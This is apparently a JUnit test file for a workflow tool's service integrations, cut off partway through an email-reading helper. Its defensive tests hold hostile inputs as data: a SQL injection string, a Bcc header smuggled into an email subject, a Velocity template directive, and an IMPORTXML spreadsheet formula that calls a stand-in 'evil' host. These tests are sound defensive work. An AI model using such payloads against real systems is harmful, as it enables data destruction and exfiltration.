package com.dopplertask.dopplertask;

import com.dopplertask.dopplertask.domain.action.integration.connection.KafkaAction;
import com.dopplertask.dopplertask.domain.action.integration.connection.RabbitMQAction;
import com.dopplertask.dopplertask.domain.action.integration.connection.MqttAction;
import com.dopplertask.dopplertask.domain.action.integration.connection.ElasticsearchAction;
import com.dopplertask.dopplertask.domain.action.integration.incident.PrometheusAction;
import com.dopplertask.dopplertask.domain.action.integration.incident.GrafanaAction;
import com.dopplertask.dopplertask.domain.action.integration.incident.DatadogAction;
import com.dopplertask.dopplertask.domain.action.integration.incident.SentryAction;
import com.dopplertask.dopplertask.domain.action.integration.infrastructure.CloudflareAction;
import com.dopplertask.dopplertask.domain.action.integration.infrastructure.DigitalOceanAction;
import com.dopplertask.dopplertask.domain.action.integration.infrastructure.OktaAction;
import com.dopplertask.dopplertask.domain.action.integration.code.GiteaAction;
import com.dopplertask.dopplertask.domain.action.integration.code.BitbucketAction;
import com.dopplertask.dopplertask.domain.action.integration.code.CircleCIAction;
import com.dopplertask.dopplertask.domain.action.integration.storage.WordPressAction;
import com.dopplertask.dopplertask.domain.action.integration.storage.BoxAction;
import com.dopplertask.dopplertask.domain.action.integration.storage.OneDriveAction;
import com.dopplertask.dopplertask.domain.action.integration.mail.OutlookAction;
import com.dopplertask.dopplertask.domain.action.integration.mail.SendGridAction;
import com.dopplertask.dopplertask.domain.action.integration.commerce.PayPalAction;
import com.dopplertask.dopplertask.domain.action.integration.sales.MailchimpAction;
import com.dopplertask.dopplertask.domain.action.integration.commerce.StripeAction;
import com.dopplertask.dopplertask.domain.action.integration.commerce.WooCommerceAction;
import com.dopplertask.dopplertask.domain.action.integration.code.FreshdeskAction;
import com.dopplertask.dopplertask.domain.action.integration.code.ClickUpAction;
import com.dopplertask.dopplertask.domain.action.integration.chat.WhatsAppAction;
import com.dopplertask.dopplertask.domain.action.integration.storage.GoogleDriveAction;
import com.dopplertask.dopplertask.domain.action.integration.storage.GoogleCalendarAction;
import com.dopplertask.dopplertask.domain.action.integration.connection.MongoDBAction;
import com.dopplertask.dopplertask.domain.ActionResult;
import com.dopplertask.dopplertask.domain.StatusCode;
import com.dopplertask.dopplertask.domain.TaskExecution;
import com.dopplertask.dopplertask.domain.action.Action;
import com.dopplertask.dopplertask.domain.TaskExecution;
import com.dopplertask.dopplertask.domain.TaskExecutionStep;
import com.dopplertask.dopplertask.domain.action.connection.PostgresAction;
import com.dopplertask.dopplertask.domain.action.connection.RedisAction;
import io.zonky.test.db.postgres.embedded.EmbeddedPostgres;
import com.dopplertask.dopplertask.domain.action.integration.code.JiraAction;
import com.dopplertask.dopplertask.domain.action.integration.chat.TelegramAction;
import com.dopplertask.dopplertask.domain.action.integration.incident.PagerDutyAction;
import com.dopplertask.dopplertask.service.TaskServiceImpl;
import com.dopplertask.dopplertask.service.VariableExtractorUtil;
import tools.jackson.databind.JsonNode;
import tools.jackson.databind.ObjectMapper;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import org.apache.velocity.app.VelocityEngine;
import org.junit.After;
import org.junit.Assert;
import org.junit.Before;
import com.dopplertask.dopplertask.domain.action.integration.mail.EmailAction;
import com.dopplertask.dopplertask.domain.action.integration.storage.S3Action;
import com.icegreen.greenmail.util.GreenMail;
import com.icegreen.greenmail.util.ServerSetupTest;
import jakarta.mail.internet.MimeMessage;
import com.dopplertask.dopplertask.domain.ExecutionParameter;
import com.dopplertask.dopplertask.domain.action.integration.anthropic.ClaudeAction;
import com.dopplertask.dopplertask.domain.action.integration.openai.OpenAIAction;
import com.dopplertask.dopplertask.domain.action.integration.JsonApi;
import com.dopplertask.dopplertask.domain.action.integration.chat.MattermostAction;
import com.dopplertask.dopplertask.domain.action.integration.chat.TeamsAction;
import com.dopplertask.dopplertask.domain.action.integration.chat.TwilioAction;
import com.dopplertask.dopplertask.domain.action.integration.mail.ReadEmailAction;
import com.dopplertask.dopplertask.domain.action.integration.storage.GoogleSheetsAction;
import com.icegreen.greenmail.util.GreenMailUtil;
import com.nimbusds.jose.JWSObject;
import com.nimbusds.jose.crypto.RSASSAVerifier;
import java.net.URLDecoder;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.interfaces.RSAPublicKey;
import java.util.Base64;
import jakarta.mail.Flags;
import jakarta.mail.Folder;
import jakarta.mail.Session;
import jakarta.mail.Store;
import org.junit.Test;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;

/**
 * Each outside service is replaced by a local server that checks what a real one would require, so these tests
 * show what is sent and how answers are read. They do not show that the real service agrees.
 */
public class IntegrationActionsTest {

    private final ObjectMapper mapper = new ObjectMapper();
    private HttpServer service;
    private String baseUrl;
    private String path;
    private String rawPath;
    private String receivedText;
    private Map<String, String> requestHeaders;
    private final Map<String, String> answersByRequest = new LinkedHashMap<>();
    private final List<String> requests = new ArrayList<>();
    private String query;
    private String method;
    private String authorization;
    private JsonNode received;
    private int answerStatus = 200;
    private String answerBody = "{}";

    @Before
    public void startService() throws IOException {
        service = HttpServer.create(new InetSocketAddress("localhost", 0), 0);
        service.createContext("/", this::answer);
        service.start();
        baseUrl = "http://localhost:" + service.getAddress().getPort();
    }

    @After
    public void stopService() {
        service.stop(0);
    }

    private void answer(HttpExchange exchange) throws IOException {
        path = exchange.getRequestURI().getPath();
        rawPath = exchange.getRequestURI().getRawPath();
        requestHeaders = new HashMap<>();
        exchange.getRequestHeaders().forEach((name, values) -> requestHeaders.put(name.toLowerCase(), values.get(0)));
        query = exchange.getRequestURI().getQuery();
        method = exchange.getRequestMethod();
        authorization = exchange.getRequestHeaders().getFirst("Authorization");
        String body = new String(exchange.getRequestBody().readAllBytes(), StandardCharsets.UTF_8);
        receivedText = body;
        requests.add(path);
        received = readJsonOrNull(body);
        String request = path + " " + body;
        String answer = answersByRequest.entrySet().stream().filter(entry -> request.contains(entry.getKey())).map(Map.Entry::getValue).findFirst().orElse(answerBody);
        byte[] bytes = answer.getBytes(StandardCharsets.UTF_8);
        exchange.sendResponseHeaders(answerStatus, bytes.length);
        exchange.getResponseBody().write(bytes);
        exchange.close();
    }

    private JsonNode readJsonOrNull(String body) {
        try {
            return body.isEmpty() ? null : mapper.readTree(body);
        } catch (tools.jackson.core.JacksonException notJson) {
            return null;
        }
    }

    private ActionResult run(Action action) throws IOException {
        return action.run(new TaskServiceImpl(), new TaskExecution(), new VariableExtractorUtil(new VelocityEngine()), null);
    }

    @Test
    public void testAServiceErrorNamesTheServiceAndItsReasonFail() throws IOException {
        answerStatus = 429;
        answerBody = "{\"error\":\"ratelimited\"}";
        ActionResult result = run(telegram());
        Assert.assertEquals(StatusCode.FAILURE, result.getStatusCode());
        Assert.assertEquals("Telegram answered with status 429: ratelimited.", result.getErrorMsg());
    }

    @Test
    public void testTextFromAnEarlierStepIsNotEvaluatedAgainSuccess() throws IOException {
        answerBody = "{\"ok\":true}";
        TaskExecution execution = new TaskExecution();
        com.dopplertask.dopplertask.domain.ExecutionParameter parameter = new com.dopplertask.dopplertask.domain.ExecutionParameter("text", "#set($x = 1)$x \"quoted\"".getBytes(StandardCharsets.UTF_8), false);
        execution.getParameters().put("text", parameter);
        TelegramAction telegram = telegram();
        telegram.setMessage("$parameters.get('text')");
        telegram.run(new TaskServiceImpl(), execution, new VariableExtractorUtil(new VelocityEngine()), null);
        Assert.assertEquals("#set($x = 1)$x \"quoted\"", received.path("text").asText());
    }

    private TelegramAction telegram() {
        TelegramAction telegram = new TelegramAction();
        telegram.setBaseUrl(baseUrl);
        telegram.setToken("123:abc");
        telegram.setChat("@alerts");
        telegram.setMessage("Disk is full");
        return telegram;
    }

    @Test
    public void testTelegramSendsTheMessageAndGivesItsIdSuccess() throws IOException {
        answerBody = "{\"ok\":true,\"result\":{\"message_id\":42}}";
        ActionResult result = run(telegram());
        Assert.assertEquals(StatusCode.SUCCESS, result.getStatusCode());
        Assert.assertEquals("/bot123:abc/sendMessage", path);
        Assert.assertEquals("@alerts", received.path("chat_id").asText());
        Assert.assertEquals("Disk is full", received.path("text").asText());
        Assert.assertEquals(42L, result.getOutputVariables().get("messageId"));
    }

    @Test
    public void testTelegramGivesItsOwnReasonWhenItRefusesFail() throws IOException {
        answerStatus = 400;
        answerBody = "{\"ok\":false,\"error_code\":400,\"description\":\"Bad Request: chat not found\"}";
        Assert.assertEquals("Telegram answered with status 400: Bad Request: chat not found.", run(telegram()).getErrorMsg());
    }

    @Test
    public void testTelegramRefusesTooLongAMessageBeforeSendingFail() throws IOException {
        TelegramAction telegram = telegram();
        telegram.setMessage("x".repeat(4097));
        Assert.assertTrue(run(telegram).getErrorMsg().contains("4096"));
        Assert.assertNull(path);
    }


    private PagerDutyAction pagerDuty() {
        PagerDutyAction pagerDuty = new PagerDutyAction();
        pagerDuty.setBaseUrl(baseUrl);
        pagerDuty.setIntegrationKey("key");
        pagerDuty.setSummary("Disk is full");
        return pagerDuty;
    }

    @Test
    public void testPagerDutyOpensAnIncidentAndGivesItsKeySuccess() throws IOException {
        answerStatus = 202;
        answerBody = "{\"status\":\"success\",\"message\":\"Event processed\",\"dedup_key\":\"abc\"}";
        ActionResult result = run(pagerDuty());
        Assert.assertEquals(StatusCode.SUCCESS, result.getStatusCode());
        Assert.assertEquals("/v2/enqueue", path);
        Assert.assertEquals("key", received.path("routing_key").asText());
        Assert.assertEquals("trigger", received.path("event_action").asText());
        Assert.assertEquals("Disk is full", received.path("payload").path("summary").asText());
        Assert.assertEquals("error", received.path("payload").path("severity").asText());
        Assert.assertEquals("abc", result.getOutputVariables().get("incidentKey"));
    }

    @Test
    public void testPagerDutyResolvesWithTheKeyAndWithoutAPayloadSuccess() throws IOException {
        answerStatus = 202;
        PagerDutyAction pagerDuty = pagerDuty();
        pagerDuty.setOperation("resolve");
        pagerDuty.setSummary(null);
        pagerDuty.setIncidentKey("abc");
        Assert.assertEquals(StatusCode.SUCCESS, run(pagerDuty).getStatusCode());
        Assert.assertEquals("abc", received.path("dedup_key").asText());
        Assert.assertTrue(received.path("payload").isMissingNode());
    }

    @Test
    public void testPagerDutyOpensWithTheKeyForTheNewIncidentSuccess() throws IOException {
        answerStatus = 202;
        PagerDutyAction pagerDuty = pagerDuty();
        pagerDuty.setNewIncidentKey("disk-web-1");
        pagerDuty.setIncidentKey("an-old-one");
        run(pagerDuty);
        Assert.assertEquals("disk-web-1", received.path("dedup_key").asText());
    }

    @Test
    public void testPagerDutyAsksForTheKeyBeforeResolvingFail() throws IOException {
        PagerDutyAction pagerDuty = pagerDuty();
        pagerDuty.setOperation("resolve");
        Assert.assertTrue(run(pagerDuty).getErrorMsg().contains("incident key"));
        Assert.assertNull(path);
    }

    @Test
    public void testAPlainSentenceFromAServiceIsTheReasonButAnErrorPageIsNotFail() throws IOException {
        answerStatus = 400;
        answerBody = "Invalid routing key";
        Assert.assertEquals("PagerDuty answered with status 400: Invalid routing key.", run(pagerDuty()).getErrorMsg());
        answerBody = "<html><body>Bad gateway</body></html>";
        Assert.assertEquals("PagerDuty answered with status 400.", run(pagerDuty()).getErrorMsg());
    }

    private JiraAction jira() {
        JiraAction jira = new JiraAction();
        jira.setSiteUrl(baseUrl);
        jira.setToken("pat");
        jira.setProject("OPS");
        jira.setSummary("Disk is full");
        jira.setIssueDescription("On web-1");
        jira.setComment("Looking at it");
        return jira;
    }

    @Test
    public void testJiraCreatesAnIssueOnOwnServerWithABearerTokenSuccess() throws IOException {
        answerStatus = 201;
        answerBody = "{\"id\":\"1\",\"key\":\"OPS-12\"}";
        ActionResult result = run(jira());
        Assert.assertEquals(StatusCode.SUCCESS, result.getStatusCode());
        Assert.assertEquals("/rest/api/2/issue", path);
        Assert.assertEquals("Bearer pat", authorization);
        Assert.assertEquals("OPS", received.path("fields").path("project").path("key").asText());
        Assert.assertEquals("Task", received.path("fields").path("issuetype").path("name").asText());
        Assert.assertEquals("On web-1", received.path("fields").path("description").asText());
        Assert.assertEquals("OPS-12", result.getOutputVariables().get("issueKey"));
        Assert.assertEquals(baseUrl + "/browse/OPS-12", result.getOutputVariables().get("url"));
    }

    @Test
    public void testJiraCommentsInTheCloudWithEmailAndTokenSuccess() throws IOException {
        answerStatus = 201;
        JiraAction jira = jira();
        jira.setEmail("a@b.se");
        jira.setOperation("addComment");
        jira.setIssueKey("OPS-12");
        ActionResult result = run(jira);
        Assert.assertEquals(StatusCode.SUCCESS, result.getStatusCode());
        Assert.assertEquals("/rest/api/2/issue/OPS-12/comment", path);
        Assert.assertEquals("Basic YUBiLnNlOnBhdA==", authorization);
        Assert.assertEquals("Looking at it", received.path("body").asText());
        Assert.assertEquals(baseUrl + "/browse/OPS-12", result.getOutputVariables().get("url"));
    }

    @Test
    public void testJiraGivesTheReasonInBothOfItsFormsFail() throws IOException {
        answerStatus = 400;
        answerBody = "{\"errorMessages\":[],\"errors\":{\"project\":\"project is required\"}}";
        Assert.assertEquals("Jira answered with status 400: project is required.", run(jira()).getErrorMsg());
        answerStatus = 404;
        answerBody = "{\"errorMessages\":[\"Issue does not exist\"],\"errors\":{}}";
        Assert.assertEquals("Jira answered with status 404: Issue does not exist.", run(jira()).getErrorMsg());
    }

    private RedisAction redis() {
        RedisAction redis = new RedisAction();
        redis.setHostname("localhost");
        redis.setPort("1");
        redis.setKey("visits");
        return redis;
    }

    @Test
    public void testRedisSaysWhereItCouldNotConnectFail() throws IOException {
        Assert.assertEquals("Could not connect to Redis at localhost:1. Check the address, and that the service is running.", run(redis()).getErrorMsg());
    }

    @Test
    public void testRedisSaysWhatIsWrongBeforeConnectingFail() throws IOException {
        RedisAction redis = redis();
        redis.setExpirySeconds("soon");
        Assert.assertTrue(run(redis).getErrorMsg().contains("number of seconds"));
        redis.setExpirySeconds(null);
        redis.setPort("first");
        Assert.assertTrue(run(redis).getErrorMsg().contains("port as a number"));
    }

    private PostgresAction postgres(EmbeddedPostgres server, String command, String values) {
        PostgresAction postgres = new PostgresAction();
        postgres.setHostname("localhost");
        postgres.setPort(String.valueOf(server.getPort()));
        postgres.setDatabase("postgres");
        postgres.setUsername("postgres");
        postgres.setCommand(command);
        postgres.setQueryValues(values);
        return postgres;
    }

    @Test
    public void testPostgresRunsAgainstARealServerAndKeepsValuesApartFromTheQuerySuccess() throws IOException {
        try (EmbeddedPostgres server = EmbeddedPostgres.start()) {
            run(postgres(server, "CREATE TABLE people (id integer, name text, born date)", null));
            String attack = "x'); DROP TABLE people; --";
            ActionResult inserted = run(postgres(server, "INSERT INTO people VALUES (?, ?, ?)", "7\n" + attack + "\n1815-12-10"));
            Assert.assertEquals(StatusCode.SUCCESS, inserted.getStatusCode());
            Assert.assertEquals(1, inserted.getOutputVariables().get("rowCount"));

            ActionResult selected = run(postgres(server, "SELECT id, name, born, NULL AS nothing FROM people WHERE id = ?", "7"));
            JsonNode row = new ObjectMapper().readTree(selected.getOutput()).path(0);
            Assert.assertEquals(7, row.path("id").asInt());
            Assert.assertTrue(row.path("id").isNumber());
            Assert.assertEquals(attack, row.path("name").asText());
            Assert.assertEquals("1815-12-10", row.path("born").asText());
            Assert.assertTrue(row.path("nothing").isNull());
            Assert.assertEquals(1, selected.getOutputVariables().get("rowCount"));

            ActionResult wrong = run(postgres(server, "SELECT * FROM nothing_here", null));
            Assert.assertEquals(StatusCode.FAILURE, wrong.getStatusCode());
            Assert.assertTrue(wrong.getErrorMsg(), wrong.getErrorMsg().startsWith("Postgres answered: ERROR: relation \"nothing_here\" does not exist"));
        }
    }

    @Test
    public void testPostgresSaysWhereItCouldNotConnectFail() throws IOException {
        PostgresAction postgres = new PostgresAction();
        postgres.setHostname("localhost");
        postgres.setPort("1");
        postgres.setDatabase("postgres");
        postgres.setCommand("SELECT 1");
        Assert.assertEquals("Could not connect to Postgres at localhost:1. Check the address, and that the service is running.", run(postgres).getErrorMsg());
    }

    @Test
    public void testARunKeepsOnlyWhatAStepDeclaresSoCookiesAreNotStoredSuccess() {
        TaskExecutionStep step = new TaskExecutionStep();
        step.keepOutputs(new TelegramAction().getOutputs().keySet(), Map.of("messageId", 7, "set-cookie", List.of("session=secret")));
        Assert.assertEquals(Map.of("messageId", 7), step.getOutputVariables());
        Assert.assertEquals(Map.of("messageId", 7), step.copyTo(new TaskExecution()).getOutputVariables());
        Assert.assertEquals(Map.of(), new TaskExecutionStep().getOutputVariables());
    }

    private EmailAction email(int port) {
        EmailAction email = new EmailAction();
        email.setHostname("localhost");
        email.setPort(String.valueOf(port));
        email.setSecurity("none");
        email.setFrom("alerts@example.com");
        email.setTo("ada@example.com, grace@example.com");
        email.setSubject("Disk is full\nBcc: everyone@example.com");
        email.setMessage("On web-1");
        return email;
    }

    @Test
    public void testEmailReachesARealServerAndAnEarlierStepCannotAddAHeaderSuccess() throws Exception {
        GreenMail server = new GreenMail(ServerSetupTest.SMTP);
        server.start();
        try {
            ActionResult result = run(email(server.getSmtp().getPort()));
            Assert.assertEquals(result.getErrorMsg(), StatusCode.SUCCESS, result.getStatusCode());
            Assert.assertNotNull(result.getOutputVariables().get("messageId"));
            MimeMessage[] messages = server.getReceivedMessages();
            Assert.assertEquals(2, messages.length);
            Assert.assertEquals("Disk is full Bcc: everyone@example.com", messages[0].getSubject());
            Assert.assertNull(messages[0].getHeader("Bcc"));
        } finally {
            server.stop();
        }
    }

    @Test
    public void testEmailDoesNotSendWithoutEncryptionWhenItIsAskedForFail() throws IOException {
        GreenMail server = new GreenMail(ServerSetupTest.SMTP);
        server.start();
        try {
            EmailAction email = email(server.getSmtp().getPort());
            email.setSecurity("starttls");
            ActionResult result = run(email);
            Assert.assertEquals(StatusCode.FAILURE, result.getStatusCode());
            Assert.assertEquals(0, server.getReceivedMessages().length);
        } finally {
            server.stop();
        }
    }

    @Test
    public void testEmailSaysWhatIsWrongFail() throws IOException {
        EmailAction email = email(1);
        Assert.assertEquals("Could not connect to the mail server at localhost:1. Check the address, and that the service is running.", run(email).getErrorMsg());
        email.setTo("not an address");
        Assert.assertTrue(run(email).getErrorMsg().startsWith("Email could not read the address"));
    }

    // The example that AWS publishes for Signature Version 4, so the signature is checked against AWS and not against this code.
    @Test
    public void testS3SignsAsThePublishedExampleFromAwsSuccess() {
        Map<String, String> headers = Map.of(
                "host", "examplebucket.s3.amazonaws.com",
                "range", "bytes=0-9",
                "x-amz-content-sha256", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                "x-amz-date", "20130524T000000Z");
        String authorization = S3Action.Companion.authorization("GET", "/test.txt", headers, "AKIAIOSFODNN7EXAMPLE", "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "us-east-1", "20130524T000000Z");
        Assert.assertEquals("AWS4-HMAC-SHA256 Credential=AKIAIOSFODNN7EXAMPLE/20130524/us-east-1/s3/aws4_request,SignedHeaders=host;range;x-amz-content-sha256;x-amz-date,Signature=f0e8bdb87c964420e857bd35b5d6ed310bd44f0170aba48dd91039c6036bdb41", authorization);
    }

    private S3Action s3() {
        S3Action s3 = new S3Action();
        s3.setBaseUrl(baseUrl);
        s3.setAccessKeyId("key");
        s3.setSecretAccessKey("secret");
        s3.setBucket("reports");
        s3.setKey("2026/today report.txt");
        return s3;
    }

    @Test
    public void testS3WritesToAnEncodedPathSuccess() throws IOException {
        S3Action s3 = s3();
        s3.setOperation("write");
        s3.setContent("{\"state\":\"fine\"}");
        ActionResult result = run(s3);
        Assert.assertEquals(result.getErrorMsg(), StatusCode.SUCCESS, result.getStatusCode());
        Assert.assertEquals("PUT", method);
        Assert.assertEquals("/reports/2026/today report.txt", path);
        Assert.assertTrue(authorization.startsWith("AWS4-HMAC-SHA256 Credential=key/"));
    }

    @Test
    public void testS3ReadsTheReasonFromItsAnswerFail() throws IOException {
        answerStatus = 404;
        answerBody = "<Error><Code>NoSuchKey</Code><Message>The specified key does not exist.</Message></Error>";
        Assert.assertEquals("S3 answered with status 404: The specified key does not exist.", run(s3()).getErrorMsg());
    }

    @Test
    public void testTeamsSendsACardSuccess() throws IOException {
        TeamsAction teams = new TeamsAction();
        teams.setWebhookUrl(baseUrl + "/workflows/secret");
        teams.setMessage("Disk is full");
        answerStatus = 202;
        answerBody = "";
        Assert.assertEquals(StatusCode.SUCCESS, run(teams).getStatusCode());
        Assert.assertEquals("application/vnd.microsoft.card.adaptive", received.path("attachments").path(0).path("contentType").asText());
        Assert.assertEquals("Disk is full", received.path("attachments").path(0).path("content").path("body").path(0).path("text").asText());
    }

    @Test
    public void testMattermostPostsAndRepliesInAThreadSuccess() throws IOException {
        MattermostAction mattermost = new MattermostAction();
        mattermost.setSiteUrl(baseUrl + "/");
        mattermost.setToken("bot");
        mattermost.setChannelId("c1");
        mattermost.setMessage("Disk is full");
        mattermost.setReplyToMessageId("m0");
        answerStatus = 201;
        answerBody = "{\"id\":\"m1\"}";
        ActionResult result = run(mattermost);
        Assert.assertEquals("/api/v4/posts", path);
        Assert.assertEquals("Bearer bot", authorization);
        Assert.assertEquals("c1", received.path("channel_id").asText());
        Assert.assertEquals("m0", received.path("root_id").asText());
        Assert.assertEquals("m1", result.getOutputVariables().get("messageId"));
    }

    private TwilioAction twilio() {
        TwilioAction twilio = new TwilioAction();
        twilio.setBaseUrl(baseUrl);
        twilio.setAccountSid("AC1");
        twilio.setToken("secret");
        twilio.setSender("+15005550006");
        twilio.setTo("+46701234567");
        twilio.setMessage("Disk is full & hot");
        return twilio;
    }

    @Test
    public void testTwilioSendsAFormAndGivesTheIdSuccess() throws IOException {
        answerStatus = 201;
        answerBody = "{\"sid\":\"SM1\"}";
        ActionResult result = run(twilio());
        Assert.assertEquals("/2010-04-01/Accounts/AC1/Messages.json", path);
        Assert.assertEquals("Basic " + Base64.getEncoder().encodeToString("AC1:secret".getBytes(StandardCharsets.UTF_8)), authorization);
        Assert.assertEquals("application/x-www-form-urlencoded", requestHeaders.get("content-type"));
        Assert.assertEquals("From=%2B15005550006&To=%2B46701234567&Body=Disk+is+full+%26+hot", receivedText);
        Assert.assertEquals("SM1", result.getOutputVariables().get("messageId"));
    }

    @Test
    public void testTwilioAsksForTheCountryCodeBeforeSendingFail() throws IOException {
        TwilioAction twilio = twilio();
        twilio.setTo("0701234567");
        Assert.assertTrue(run(twilio).getErrorMsg().contains("country code"));
        Assert.assertNull(path);
    }

    private KeyPair sheetsKeys;

    private GoogleSheetsAction sheets() throws Exception {
        KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
        generator.initialize(2048);
        sheetsKeys = generator.generateKeyPair();
        String pem = "-----BEGIN PRIVATE KEY-----\n" + Base64.getMimeEncoder().encodeToString(sheetsKeys.getPrivate().getEncoded()) + "\n-----END PRIVATE KEY-----\n";
        GoogleSheetsAction sheets = new GoogleSheetsAction();
        sheets.setBaseUrl(baseUrl);
        sheets.setServiceAccountKey(mapper.writeValueAsString(Map.of("client_email", "bot@acme.iam.gserviceaccount.com", "private_key", pem, "token_uri", baseUrl + "/token")));
        sheets.setSpreadsheet("https://docs.google.com/spreadsheets/d/sheet-id_1/edit#gid=0");
        sheets.setSheet("My tab");
        answersByRequest.put("/token", "{\"access_token\":\"goog\"}");
        return sheets;
    }

    @Test
    public void testGoogleSheetsSignsInAndReadsRowsByColumnNameSuccess() throws Exception {
        answerBody = "{\"values\":[[\"name\",\"city\"],[\"Ada\",\"London\"],[\"Grace\"]]}";
        ActionResult result = run(sheets());
        Assert.assertEquals(result.getErrorMsg(), StatusCode.SUCCESS, result.getStatusCode());
        Assert.assertEquals("/v4/spreadsheets/sheet-id_1/values/My%20tab", rawPath);
        Assert.assertEquals("Bearer goog", authorization);
        JsonNode rows = mapper.readTree(result.getOutput());
        Assert.assertEquals("London", rows.path(0).path("city").asText());
        Assert.assertTrue(rows.path(1).path("city").isMissingNode());
        Assert.assertEquals(2, result.getOutputVariables().get("rowCount"));
    }

    @Test
    public void testGoogleSheetsSignsTheTokenRequestWithTheKeyFileSuccess() throws Exception {
        GoogleSheetsAction sheets = sheets();
        List<String> tokenRequests = new ArrayList<>();
        service.removeContext("/");
        service.createContext("/", exchange -> {
            String body = new String(exchange.getRequestBody().readAllBytes(), StandardCharsets.UTF_8);
            tokenRequests.add(body);
            byte[] bytes = "{\"access_token\":\"goog\"}".getBytes(StandardCharsets.UTF_8);
            exchange.sendResponseHeaders(200, bytes.length);
            exchange.getResponseBody().write(bytes);
            exchange.close();
        });
        run(sheets);
        String form = URLDecoder.decode(tokenRequests.get(0), StandardCharsets.UTF_8);
        JWSObject assertion = JWSObject.parse(form.substring(form.indexOf("assertion=") + "assertion=".length()));
        Assert.assertTrue(assertion.verify(new RSASSAVerifier((RSAPublicKey) sheetsKeys.getPublic())));
        Assert.assertEquals("bot@acme.iam.gserviceaccount.com", assertion.getPayload().toJSONObject().get("iss"));
    }

    @Test
    public void testGoogleSheetsWritesValuesAsTextSoTheyCannotBeFormulasSuccess() throws Exception {
        GoogleSheetsAction sheets = sheets();
        sheets.setOperation("addRow");
        sheets.setRowValues("Ada\n=IMPORTXML(\"https://evil\",\"//a\")");
        Assert.assertEquals(StatusCode.SUCCESS, run(sheets).getStatusCode());
        Assert.assertEquals("valueInputOption=RAW", query);
        Assert.assertEquals("=IMPORTXML(\"https://evil\",\"//a\")", received.path("values").path(0).path(1).asText());
    }

    @Test
    public void testGoogleSheetsSaysWhenTheKeyFileIsWrongFail() throws Exception {
        GoogleSheetsAction sheets = sheets();
        sheets.setServiceAccountKey("not json");
        Assert.assertTrue(run(sheets).getErrorMsg().contains("could not read the key file"));
        sheets.setServiceAccountKey("{\"private_key\":\"nope\"}");
        Assert.assertTrue(run(sheets).getErrorMsg().contains("private key"));
    }

    private ClaudeAction claude() {
        ClaudeAction claude = new ClaudeAction();
        claude.setBaseUrl(baseUrl);
        claude.setApiKey("sk-test");
        claude.setInstructions("Be short.");
        claude.setUserInput("Is the disk full?");
        return claude;
    }

    @Test
    public void testClaudeAsksWithTheCurrentApiAndGivesTheTextSuccess() throws IOException {
        answerBody = "{\"content\":[{\"type\":\"thinking\",\"thinking\":\"\"},{\"type\":\"text\",\"text\":\"Yes.\"}],\"stop_reason\":\"end_turn\",\"usage\":{\"input_tokens\":12,\"output_tokens\":3}}";
        ActionResult result = run(claude());
        Assert.assertEquals("/v1/messages", path);
        Assert.assertEquals("sk-test", requestHeaders.get("x-api-key"));
        Assert.assertEquals("2026-10-21", requestHeaders.get("anthropic-version"));
        Assert.assertEquals("server-side-fallback-2026-07-01", requestHeaders.get("anthropic-beta"));
        Assert.assertEquals("claude-opus-5-5", received.path("model").asText());
        Assert.assertEquals(16000, received.path("max_tokens").asInt());
        Assert.assertEquals("Be short.", received.path("system").asText());
        Assert.assertEquals("default", received.path("fallbacks").asText());
        Assert.assertEquals("medium", received.path("output_config").path("effort").asText());
        Assert.assertEquals("Is the disk full?", received.path("messages").path(0).path("content").asText());
        Assert.assertEquals("Yes.", result.getOutput());
        Assert.assertEquals(12L, result.getOutputVariables().get("inputTokens"));
    }

    @Test
    public void testDataInATaskCannotChooseWhereAStepSendsItsKeyFail() throws IOException {
        TaskExecution execution = new TaskExecution();
        execution.getParameters().put("where", new ExecutionParameter("where", baseUrl.getBytes(StandardCharsets.UTF_8), false));
        ClaudeAction claude = claude();
        claude.setBaseUrl("$parameters.get(\"where\")");
        PagerDutyAction pagerDuty = pagerDuty();
        pagerDuty.setBaseUrl("$parameters.get(\"where\")");
        for (Action step : List.of(claude, pagerDuty)) {
            ActionResult result = step.run(new TaskServiceImpl(), execution, new VariableExtractorUtil(new VelocityEngine()), null);
            Assert.assertEquals(StatusCode.FAILURE, result.getStatusCode());
        }
        Assert.assertTrue(requests.isEmpty());
    }

    @Test
    public void testABaseAddressIsTakenAsWrittenSuccess() {
        Assert.assertEquals("http://localhost:8080", JsonApi.INSTANCE.baseAddress(" http://localhost:8080/ "));
        Assert.assertEquals("https://api.anthropic.com", JsonApi.INSTANCE.baseAddress(new ClaudeAction().getBaseUrl()));
        Assert.assertEquals("https://api.openai.com/v1", JsonApi.INSTANCE.baseAddress(new OpenAIAction().getBaseUrl()));
        Assert.assertEquals("", JsonApi.INSTANCE.baseAddress(null));
    }

    @Test
    public void testClaudeOnlyAsksForAFallbackFromAModelThatHasOneSuccess() throws IOException {
        ClaudeAction claude = claude();
        claude.setModel("claude-haiku-5-5");
        run(claude);
        Assert.assertNull(requestHeaders.get("anthropic-beta"));
        Assert.assertTrue(received.path("fallbacks").isMissingNode());
    }

    @Test
    public void testClaudeFailsWhenItDeclinesOrIsCutOffFail() throws IOException {
        answerBody = "{\"content\":[],\"stop_reason\":\"refusal\",\"stop_details\":{\"type\":\"refusal\",\"category\":\"cyber\",\"explanation\":\"Not this.\"}}";
        Assert.assertEquals("Claude declined to answer: Not this.", run(claude()).getErrorMsg());
        answerBody = "{\"content\":[{\"type\":\"text\",\"text\":\"Half an\"}],\"stop_reason\":\"max_tokens\"}";
        ActionResult cutOff = run(claude());
        Assert.assertEquals(StatusCode.FAILURE, cutOff.getStatusCode());
        Assert.assertTrue(cutOff.getErrorMsg().contains("cut off"));
    }

    @Test
    public void testClaudeGivesTheReasonFromItsNestedErrorFail() throws IOException {
        answerStatus = 401;
        answerBody = "{\"type\":\"error\",\"error\":{\"type\":\"authentication_error\",\"message\":\"invalid x-api-key\"}}";
        Assert.assertEquals("Claude answered with status 401: invalid x-api-key.", run(claude()).getErrorMsg());
    }

    private ReadEmailAction readEmail(GreenMail server) {
        ReadEmailAction readEmail = new ReadEmailAction();
        readEmail.setHostname("localhost");
        readEmail.setPort(String.valueOf(server.getImap().getPort()));
        readEmail.setSecurity("none");
        readEmail.setUsername("ops");
